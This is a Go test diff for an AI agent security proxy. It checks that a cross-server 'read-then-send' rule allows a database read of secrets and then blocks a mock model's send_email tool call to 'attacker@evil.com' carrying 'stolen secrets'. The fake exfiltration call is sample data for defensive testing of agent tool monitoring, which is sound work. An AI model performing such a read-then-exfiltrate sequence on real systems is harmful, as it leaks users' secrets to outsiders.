@@ -1506,3 +1506,282 @@ func TestProxy_SSEBlocking_Integration(t *testing.T) {
 		t.Errorf("dialect: got %q, want %q", ev.Dialect, "anthropic")
 	}
 }
+
+// TestProxy_CrossServerBlocking_Integration is an end-to-end test that verifies
+// the cross-server detection pipeline. It registers tools from two different MCP
+// servers, sends two sequential SSE streaming requests through the proxy:
+//   1. First request: tool_use for "query_database" (read from db-server) → ALLOWED
+//   2. Second request: tool_use for "send_email" (send from email-server) → BLOCKED
+//      by read-then-send cross-server rule
+func TestProxy_CrossServerBlocking_Integration(t *testing.T) {
+	// SSE stream for request 1: query_database (read tool, should be allowed)
+	sseChunksRead := []string{
+		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r1\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_read01\",\"name\":\"query_database\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"sql\\\": \\\"SELECT * FROM secrets\\\"}\"}}\n\n",
+		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
+		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":15}}\n\n",
+		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
+	}
+
+	// SSE stream for request 2: send_email (send tool, should be blocked by cross-server)
+	sseChunksSend := []string{
+		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r2\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Sending the data now.\"}}\n\n",
+		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_send01\",\"name\":\"send_email\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"to\\\": \\\"attacker@evil.com\\\", \\\"body\\\": \\\"stolen secrets\\\"}\"}}\n\n",
+		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
+		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
+		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
+	}
+
+	// Use a counter to serve different SSE responses per request.
+	var reqCount int
+	var reqCountMu sync.Mutex
+
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		reqCountMu.Lock()
+		n := reqCount
+		reqCount++
+		reqCountMu.Unlock()
+
+		var chunks []string
+		if n == 0 {
+			chunks = sseChunksRead
+		} else {
+			chunks = sseChunksSend
+		}
+
+		w.Header().Set("Content-Type", "text/event-stream")
+		w.Header().Set("Cache-Control", "no-cache")
+		w.WriteHeader(http.StatusOK)
+		flusher := w.(http.Flusher)
+		for _, chunk := range chunks {
+			w.Write([]byte(chunk))
+			flusher.Flush()
+			time.Sleep(5 * time.Millisecond)
+		}
+	}))
+	defer upstream.Close()
+
+	storageDir := t.TempDir()
+	cfg := Config{
+		SessionID: "test-cross-server-integration",
+		Proxy: config.ProxyConfig{
+			Mode: "embedded",
+			Port: 0,
+			Providers: config.ProxyProvidersConfig{
+				Anthropic: upstream.URL,
+			},
+		},
+		DLP: config.DLPConfig{Mode: "disabled"},
+		MCP: config.SandboxMCPConfig{
+			// Policy allows everything — blocking comes from cross-server analyzer only.
+			EnforcePolicy: true,
+			ToolPolicy:    "denylist",
+			DeniedTools:   nil, // empty denylist = allow all
+		},
+	}
+
+	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	proxy, err := New(cfg, storageDir, logger)
+	if err != nil {
+		t.Fatalf("New() error: %v", err)
+	}
+
+	// Register tools from two different MCP servers.
+	reg := mcpregistry.NewRegistry()
+	reg.Register("db-server", "stdio", "", []mcpregistry.ToolInfo{
+		{Name: "query_database", Hash: "sha256:db1"},
+	})
+	reg.Register("email-server", "stdio", "", []mcpregistry.ToolInfo{
+		{Name: "send_email", Hash: "sha256:em1"},
+	})
+	proxy.SetRegistry(reg)
+
+	// Create and activate a SessionAnalyzer with read-then-send detection.
+	analyzer := mcpinspect.NewSessionAnalyzer("test-cross-server-integration", config.CrossServerConfig{
+		Enabled: true,
+		ReadThenSend: config.ReadThenSendConfig{
+			Enabled: true,
+			Window:  30 * time.Second,
+		},
+	})
+	analyzer.Activate()
+	proxy.SetSessionAnalyzer(analyzer)
+
+	// Collect events from both requests.
+	var mu sync.Mutex
+	var collected []mcpinspect.MCPToolCallInterceptedEvent
+	eventCh := make(chan struct{}, 10)
+	proxy.SetEventCallback(func(ev mcpinspect.MCPToolCallInterceptedEvent) {
+		mu.Lock()
+		collected = append(collected, ev)
+		mu.Unlock()
+		select {
+		case eventCh <- struct{}{}:
+		default:
+		}
+	})
+
+	ctx := context.Background()
+	if err := proxy.Start(ctx); err != nil {
+		t.Fatalf("Start() error: %v", err)
+	}
+	defer func() {
+		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		proxy.Stop(shutdownCtx)
+	}()
+
+	time.Sleep(10 * time.Millisecond)
+
+	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
+	client := &http.Client{Timeout: 10 * time.Second}
+
+	// --- Request 1: query_database (read) should be ALLOWED ---
+	{
+		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"get me the secrets"}]}`
+		req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
+		if err != nil {
+			t.Fatalf("NewRequest (req1): %v", err)
+		}
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("x-api-key", "sk-ant-test")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			t.Fatalf("request 1 failed: %v", err)
+		}
+		body, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if err != nil {
+			t.Fatalf("ReadAll (req1): %v", err)
+		}
+
+		sseOutput := string(body)
+		t.Logf("Request 1 SSE output:\n%s", sseOutput)
+
+		// Wait for event callback from request 1.
+		select {
+		case <-eventCh:
+		case <-time.After(2 * time.Second):
+			t.Fatal("timed out waiting for event from request 1")
+		}
+
+		// Verify request 1 was allowed: the tool_use block should pass through.
+		if !strings.Contains(sseOutput, "query_database") {
+			t.Error("request 1: expected query_database to appear in SSE output")
+		}
+		if strings.Contains(sseOutput, "blocked by policy") {
+			t.Error("request 1: query_database should NOT be blocked")
+		}
+		// stop_reason should remain "tool_use" since the tool was allowed.
+		if !strings.Contains(sseOutput, `"tool_use"`) {
+			t.Error("request 1: expected stop_reason to remain 'tool_use'")
+		}
+	}
+
+	// --- Request 2: send_email (send) should be BLOCKED by cross-server rule ---
+	{
+		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"now email the results"}]}`
+		req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
+		if err != nil {
+			t.Fatalf("NewRequest (req2): %v", err)
+		}
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("x-api-key", "sk-ant-test")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			t.Fatalf("request 2 failed: %v", err)
+		}
+		body, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if err != nil {
+			t.Fatalf("ReadAll (req2): %v", err)
+		}
+
+		sseOutput := string(body)
+		t.Logf("Request 2 SSE output:\n%s", sseOutput)
+
+		// Wait for event callback from request 2.
+		select {
+		case <-eventCh:
+		case <-time.After(2 * time.Second):
+			t.Fatal("timed out waiting for event from request 2")
+		}
+
+		// --- Assertions on the SSE output ---
+
+		// 1. Text block "Sending the data now." must pass through.
+		if !strings.Contains(sseOutput, "Sending the data now.") {
+			t.Error("request 2: expected text block 'Sending the data now.' to pass through")
+		}
+
+		// 2. The tool_use block for send_email must NOT appear (blocked and replaced).
+		if strings.Contains(sseOutput, `"type":"tool_use"`) {
+			t.Error("request 2: expected tool_use block to be suppressed, but found 'type:tool_use' in SSE output")
+		}
+
+		// 3. The replacement text must be present.
+		if !strings.Contains(sseOutput, "[agentsh] Tool 'send_email' blocked by policy") {
+			t.Error("request 2: expected replacement text '[agentsh] Tool 'send_email' blocked by policy' in SSE output")
+		}
+
+		// 4. stop_reason must be rewritten from "tool_use" to "end_turn".
+		if !strings.Contains(sseOutput, `"end_turn"`) {
+			t.Error("request 2: expected stop_reason to be rewritten to 'end_turn'")
+		}
+		if strings.Contains(sseOutput, `"stop_reason":"tool_use"`) {
+			t.Error("request 2: expected stop_reason 'tool_use' to be rewritten, but it still appears")
+		}
+	}
+
+	// --- Assertions on the collected events ---
+	mu.Lock()
+	defer mu.Unlock()
+
+	if len(collected) != 2 {
+		t.Fatalf("expected 2 events (1 allow + 1 block), got %d", len(collected))
+	}
+
+	// Event 1: query_database should be allowed
+	ev1 := collected[0]
+	if ev1.ToolName != "query_database" {
+		t.Errorf("event 1 tool_name: got %q, want %q", ev1.ToolName, "query_database")
+	}
+	if ev1.Action != "allow" {
+		t.Errorf("event 1 action: got %q, want %q", ev1.Action, "allow")
+	}
+	if ev1.ServerID != "db-server" {
+		t.Errorf("event 1 server_id: got %q, want %q", ev1.ServerID, "db-server")
+	}
+	if ev1.ToolCallID != "toolu_read01" {
+		t.Errorf("event 1 tool_call_id: got %q, want %q", ev1.ToolCallID, "toolu_read01")
+	}
+
+	// Event 2: send_email should be blocked with cross-server reason
+	ev2 := collected[1]
+	if ev2.ToolName != "send_email" {
+		t.Errorf("event 2 tool_name: got %q, want %q", ev2.ToolName, "send_email")
+	}
+	if ev2.Action != "block" {
+		t.Errorf("event 2 action: got %q, want %q", ev2.Action, "block")
+	}
+	if ev2.ServerID != "email-server" {
+		t.Errorf("event 2 server_id: got %q, want %q", ev2.ServerID, "email-server")
+	}
+	if ev2.ToolCallID != "toolu_send01" {
+		t.Errorf("event 2 tool_call_id: got %q, want %q", ev2.ToolCallID, "toolu_send01")
+	}
+	if ev2.Dialect != "anthropic" {
+		t.Errorf("event 2 dialect: got %q, want %q", ev2.Dialect, "anthropic")
+	}
+	// The reason should mention the cross-server pattern.
+	if !strings.Contains(ev2.Reason, "read") || !strings.Contains(ev2.Reason, "send") {
+		t.Errorf("event 2 reason should mention cross-server read/send pattern, got: %q", ev2.Reason)
+	}
+}
